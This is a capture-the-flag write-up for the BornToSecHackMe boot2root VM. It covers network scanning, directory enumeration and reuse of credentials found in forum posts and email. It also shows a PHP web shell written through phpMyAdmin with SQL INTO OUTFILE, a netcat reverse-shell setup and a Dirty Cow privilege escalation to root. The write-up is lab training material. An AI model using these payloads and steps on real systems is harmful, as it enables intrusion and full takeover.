# Boot2Root - Writeup1 Summary

## Network Discovery and Service Enumeration

The target VM operates in bridged network mode. Begin by identifying your local IP address:

```bash
ifconfig
```
Example output shows the local IP as 192.168.1.47. Perform a network scan to locate the VM:

```bash
nmap 192.168.1.0/24
```


## Identified target IP: 192.168.1.22
Open services:

```bash
FTP (21)

SSH (22)

HTTP (80)

HTTPS (443)

IMAP (143)

IMAPS (993)
```

## Web Server Analysis
Initial Reconnaissance
Access the web server on port 80:

```bash
curl 192.168.1.22
```

The response contains a basic HTML page .

## Directory Enumeration

Use dirb to discover hidden paths over HTTPS:

```bash
dirb https://192.168.1.22 -r
```

Discovered endpoints:

Forum: https://192.168.1.22/forum/

phpMyAdmin: https://192.168.1.22/phpmyadmin/

Webmail: https://192.168.1.22/webmail/


## Service Exploration
## 1-Forum Analysis
Review forum posts. A post by user lmezard contains SSH logs with an apparent password attempt:

Password: !q\]Ej?*5K5cy*AJ

Use these credentials to log into the forum (user: lmezard).

Discover the associated email: laurie@borntosec.net


## 2-Webmail Access
Log into webmail (Roundcube) using laurie@borntosec.net and the found password.

Retrieve database credentials from an email:
Username: root
Password: Fg-'kKXBj87E:aJ$

## 3-phpMyAdmin Exploitation
Access phpMyAdmin with the obtained credentials.

Execute SQL injection to create a web shell:

```bash
SELECT 1, '<?php system($_GET["cmd"]." 2>&1"); ?>' 
INTO OUTFILE '/var/www/forum/templates_c/backdoor.php'
```

Server Compromise
Reverse Shell Setup
Host a netcat listener locally:

```bash
ncat -nvklp 1234
```

Trigger reverse shell via the web backdoor (URL-encoded Python reverse shell command):
```bash
curl --insecure 'https://192.168.1.22/forum/templates_c/backdoor.php?cmd=[ENCODED_COMMAND]'
```

Gain limited access as www-data.

## Privilege Escalation (Dirty Cow Exploit)
 1-Check kernel version (vulnerable to CVE-2016-5195):
```bash
uname -a  # Output: Linux BornToSecHackMe 3.2.0-91-generic-pae
```
    Upload/Write Exploit Code:
    Save as dirty.c (code reference => https://github.com/FireFart/dirtycow).

 2-Compile and execute Dirty Cow exploit:
```bash
 gcc dirty.c -o dirty -pthread -lcrypt
./dirty

```

 3-Set new root password via exploit and escalate privileges:

```bash
 su root
Password: [Exploit-defined password, e.g., 'q']
```

## Final Steps
Confirm root access:

```bash
id  # Output: uid=0(root) gid=0(root) groups=0(root)
```

Locate final flag:
```bash
cat /root/README  # Contains "CONGRATULATIONS!!!!"
```



